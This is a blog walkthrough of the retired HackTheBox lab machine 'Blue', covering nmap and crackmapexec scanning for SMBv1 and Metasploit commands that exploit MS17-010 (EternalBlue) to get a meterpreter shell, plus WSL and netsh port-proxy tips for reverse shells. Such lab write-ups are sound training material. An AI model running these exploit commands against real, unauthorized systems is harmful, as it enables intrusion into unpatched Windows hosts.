---
layout: post
title: Blue by Hack the Box
meta: Okay in todays walkthrough we will be looking at the retired HackTheBox machine “Blue”.
category:
  - hack-the-box
image: card1-img.png
date: 2020-12-03
tags:
    - internal-inf
    - external-inf
    - nessus
    - scanning
    - host-discovery
    - port-scanning
permalink: blog/:title
---
<style>
  .hover-link:hover {
    
  }

  .hover-link {
    font-weight: bold;
    cursor: pointer;
    color: #05cfa3;
  }
</style>

Okay in todays walkthrough we will be looking at the retired HackTheBox machine “Blue”.

![info-card]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/info-card.png "info-card")

Lets start out looking for open ports using the network mapper tool.

We will run <code>nmap</code> with the default scripts, operating system version detection and traceroute <code>-A</code>. We will scan all ports <code>-p-</code> and we will turn off discovery <code> -Pn</code> as we know the host exists.

![nmap-scan]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/nmap-scan.jpg "nmap-scan")

So looks like we have a Windows box, Windows 7 Professional to be more exact.

Lets just check that SMB version 1 has not been disabled. I like to use crackmapexec for this, I find it faster than nmap for this task.

![crackmapexec]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/crackmapexec.png "crackmapexec")

If we wanted to use nmap we could use the smb-protocols.nse script.

{% highlight PowerShell%}
sudo nmap -sT -Pn -p 445 --script=smb-protocols.nse 10.10.10.40
{% endhighlight %}

Here we can see the version of SMB supported.

![nmap-smb-protocols]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/nmap-smb-protocols.png "nmap-smb-protocols")

SMBv1 in use on a legacy Windows operating system screams check SMB vulnerabilities. We can run all of nmap smb scripts using globbing. If we enter <code>--script smb*</code> we will run all NSE scripts that start with smb.

![nmap-smb-scripts]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/nmap-smb-scripts.jpg "nmap-smb-scripts")

We have a confirmed vulnerability. To exploit we are going to use Metasploit. I am currently using version 2 of the WSL and so my interface out onto the network is currently NAT’ed. This means we wont be able to get reverse shells back without making amendments to the windows firewall using <code>netsh portproxy</code>.

We start Metasploit with the following command as this commands ensures the database starts up before running the msfconsole.

{% highlight PowerShell%}
msfdb run
{% endhighlight %}

To exploit the box using Eternal Blue

{% highlight PowerShell%}
se windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.40
set payload windows/x64/meterpreter/bind_tcp
run
{% endhighlight %}

![metasploit-module-options-reverse-shell]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/metasploit-module-options-reverse-shell.png "metasploit-module-options-reverse-shell")

The below is the typical output that displays on the screen.

![meterpreter-shell]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/meterpreter-shell.jpg "meterpreter-shell")

We have a shell. Let us locate the user and admin/root flags.

User flag

![user-flag]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/user-flag.png "user-flag")

Root Flag

![root-flag]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/root-flag.jpg "root-flag")

We mentioned that one of the limitations of using the WSLv2 is we are not able to get reverse shells without using the firewall as a proxy.

{% highlight PowerShell%}
netsh interface portproxy add v4tov4 listenport=<port windows host> listenaddress=<htb vpn> connectport=<wsl port> connectaddress=<wsl ip>
{% endhighlight %}

The older version of the WSL (version 1) utilised the network interfaces on the windows host. As a workaround we can set the version of the WSL in use on the machine to WSLv1 with the following command.

{% highlight PowerShell%}
wsl --set-version kali-linux 1
{% endhighlight %}

Just replace your machine name if it is not called “kali-linux” with the name of your machine. You can check out the name of you machine and its current version with the wsl -l -v command.

![wsl-set-kali-version1]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/wsl-set-kali-version1.png "wsl-set-kali-version1")

Now we can verify the version of the machine.

![wsl-l-v]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/wsl-l-v.png "wsl-l-v")

Now we can use a reverse shell.

![wsl-l-v]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/wsl-l-v.png "wsl-l-v") 

This time you will see at the start of execution Metasploit “Started reverse TCP handler on 10.10.14.15:12345”

![meterpreter-reverse-shell]({{ site.baseurl }}/assets/images/article-images/blue-hack-the-box/meterpreter-reverse-shell.png "meterpreter-reverse-shell")